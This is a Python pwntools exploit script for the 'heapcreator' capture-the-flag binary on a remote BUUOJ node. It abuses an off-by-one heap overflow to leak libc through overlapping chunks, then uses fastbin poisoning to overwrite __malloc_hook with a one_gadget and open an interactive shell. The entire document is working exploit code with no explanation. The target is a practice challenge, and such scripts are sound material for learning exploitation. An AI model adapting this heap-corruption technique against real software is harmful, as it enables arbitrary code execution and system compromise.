from pwn import *

#context.log_level = 'debug'

#p = process('./heapcreator')
p = remote('node4.buuoj.cn', 25924)

libc = ELF('libc-2.23.buu.so')

def alloc(size):
	p.sendlineafter(b'Your choice :', b'1')
	p.sendlineafter(b'Size of Heap : ', str(size).encode())
	p.sendlineafter(b'Content of heap:', b'')
	
def edit(index, content):
	p.sendlineafter(b'Your choice :', b'2')
	p.sendlineafter(b'Index :', str(index).encode())
	p.sendafter(b'Content of heap : ', content)

def show(index):
	p.sendlineafter(b'Your choice :', b'3')
	p.sendlineafter(b'Index :', str(index).encode())
	
def delete(index):
	p.sendlineafter(b'Your choice :', b'4')
	p.sendlineafter(b'Index :', str(index).encode())

heaparray = 0x6020A0
one_gadget = 0x4526a #0x4525a

#off by one,leak libc
alloc(0x18) #0
alloc(0x18) #1
alloc(0x88) #2
alloc(0x80) #3

edit(0, b'a' * 0x18 + b'\xf1')
delete(1) #1
alloc(0xe0) #1
delete(2)
edit(1, b'a' * 8)
show(1)
p.recvuntil(b'aaaaaaaa')
malloc_hook = u64(p.recv(6).ljust(8, b'\0')) - 0x58 - 0x10

libc_base = malloc_hook - libc.sym['__malloc_hook']
one_gadget = libc_base + one_gadget

print('[+] malloc_hook -> {}'.format(hex(malloc_hook)))
print('[+] libc_base -> {}'.format(hex(libc_base)))

#write to malloc_hook + 0x23
alloc(0x80) #
alloc(0x18) #4
alloc(0x18) #5
alloc(0x68) #6
alloc(0x88)

edit(4, b'a' * 0x18 + b'\xd1')
delete(5)
alloc(0xc0) #5
delete(6)
edit(5, b'a' * 0x18 + p64(0x21) + b'\0' * 0x18 + p64(0x21) + b'\0' * 0x18 + p64(0x71) + p64(malloc_hook - 0x23))
alloc(0x60) #7
alloc(0x60) #8

edit(8, b'a' * 0x13 + p64(one_gadget))

p.sendlineafter(b'Your choice :', b'1')

p.interactive()
